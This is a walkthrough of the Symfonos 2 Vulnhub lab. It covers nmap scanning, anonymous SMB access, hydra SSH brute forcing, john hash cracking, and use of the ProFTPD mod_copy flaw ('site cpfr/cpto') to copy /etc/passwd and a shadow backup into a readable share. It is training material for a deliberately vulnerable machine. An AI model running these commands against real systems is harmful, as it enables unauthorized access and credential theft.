---
layout: default
title : muzec - Symfonos 2 Vulnhub Writeup
---

![image](https://user-images.githubusercontent.com/69868171/157857545-a60d0841-495b-4591-a13b-036ac2be8fb2.png)

Symfonos 2 is here to be pwned by you man XD.

We always start with an nmap scan.....

```
nmap -p- --min-rate 10000 -oN nmap/fullport.tcp -v 172.16.139.168
```

```
# Nmap 7.91 scan initiated Fri Mar  4 07:49:04 2022 as: nmap -p- --min-rate 10000 -oN nmap/fullport.tcp -v 172.16.139.168
Nmap scan report for 172.16.139.168
Host is up (0.00018s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Mar  4 07:49:07 2022 -- 1 IP address (1 host up) scanned in 2.22 seconds
```

Some cool ports i guess now some default nmap scripts and service detection on it.

```
nmap -sC -sV -oN nmap/normal.tcp -p 21,22,80,139,445 172.16.139.168
```

```
# Nmap 7.91 scan initiated Fri Mar  4 07:49:45 2022 as: nmap -sC -sV -oN nmap/normal.tcp -p 21,22,80,139,445 172.16.139.168
Nmap scan report for 172.16.139.168
Host is up (0.00035s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
80/tcp  open  http        WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 4h59m42s, deviation: 3h27m50s, median: 2h59m42s
|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos2
|   NetBIOS computer name: SYMFONOS2\x00
|   Domain name: \x00
|   FQDN: symfonos2
|_  System time: 2022-03-04T03:49:42-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-03-04T09:49:42
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar  4 07:50:04 2022 -- 1 IP address (1 host up) scanned in 19.24 seconds
```

Now that is more better i always stated to start with low hanging fruit like `FTP, SMB` and seems we have both but seems we have no anonymous access to FTP let check `SMB` .

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos2]
└─$ smbclient -L //172.16.109.163/ -N       

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
SMB1 disabled -- no workgroup available
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos2]
└─$ 
```

Now seems we have anonymous access to a disk let go ahead and see what we have in it.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos2]
└─$ smbclient  //172.16.109.163/anonymous -N 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul 18 15:30:09 2019
  ..                                  D        0  Thu Jul 18 15:29:08 2019
  backups                             D        0  Thu Jul 18 15:25:17 2019

                19728000 blocks of size 1024. 16313236 blocks available
smb: \> cd backups
smb: \backups\> ls
  .                                   D        0  Thu Jul 18 15:25:17 2019
  ..                                  D        0  Thu Jul 18 15:30:09 2019
  log.txt                             N    11394  Thu Jul 18 15:25:16 2019

                19728000 blocks of size 1024. 16313236 blocks available
smb: \backups\> get log.txt
getting file \backups\log.txt of size 11394 as log.txt (370.9 KiloBytes/sec) (average 370.9 KiloBytes/sec)
smb: \backups\> 

```

Now we found a `log.txt` so i downloaded it on our attacking machine to see what we have in the `log.txt` file.

![image](https://user-images.githubusercontent.com/69868171/157862394-868d209e-9de8-4881-bf38-9ee5607595de.png)

Now that is interesting it both `SMB, FTP` logs file going through it i found a username.

![image](https://user-images.githubusercontent.com/69868171/157862549-260e829a-e5cc-4971-aa73-ec1c5e56461b.png)

Now that is a lead i guess so i start brute forcing `SSH` and leave it running in the background now back to the `FTP` seems we know the version let do some research on it.


```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos2]
└─$ hydra -l aeolus -P passwordlist.txt ssh://172.16.109.163 -t 4
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-11 09:58:59
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 70188 login tries (l:1/p:70188), ~17547 tries per task
[DATA] attacking ssh://172.16.109.163:22/
```

![image](https://user-images.githubusercontent.com/69868171/157863305-52a9c45a-0008-43dc-9445-98e3a90492e9.png)

Now that is an exploit we can use to copy the backup `shadow` file.

![image](https://user-images.githubusercontent.com/69868171/157863687-0a19eda3-ee71-409b-a2f6-f0eb71003b43.png)

So when going through the exploit seems it possible to copy a file on the target seems we know the path of the share we have access to on `SMB` it possible to copy the `shadow.bak` file to the anonymous share we have access to.

![image](https://user-images.githubusercontent.com/69868171/157866709-9bb52e25-6d26-416e-9e53-1abc69c9d60d.png)

```
telnet 172.16.109.163 21

site cpfr /etc/passwd

site cpto /home/aeolus/share/passwd.bak
```


![image](https://user-images.githubusercontent.com/69868171/157866882-699c31d9-327d-4005-b172-f0e98c80a93a.png)

Now that confirm it let copy the shadow file backup now.

![image](https://user-images.githubusercontent.com/69868171/157867270-506c265e-1d02-478f-b57c-3b67511e0b6e.png)

Now we have it still confuse how i know about the backup shadow file check the `log.txt` again screenshot below.

![image](https://user-images.githubusercontent.com/69868171/157867530-c1a702e5-db49-4f2d-8327-076b9b1abbe0.png)

Now you have it.

![image](https://user-images.githubusercontent.com/69868171/157867647-0b48bc72-4b95-4ee7-b04f-38a431879bb6.png)

Now we have the hashes let crack it with `john the ripper` when running in the background let try something on the `proFTPD` exploit to see if we can get RCE.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos2]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt shadow.bak
```

Now back to `proFTPD` RCE.

![image](https://user-images.githubusercontent.com/69868171/157868391-fb8cbd12-1fb3-4fff-a747-57f928f3b837.png)


But seems it a deadend we have no write access, permission on `/var/wwww/html` now back to the shadow file that we are cracking.

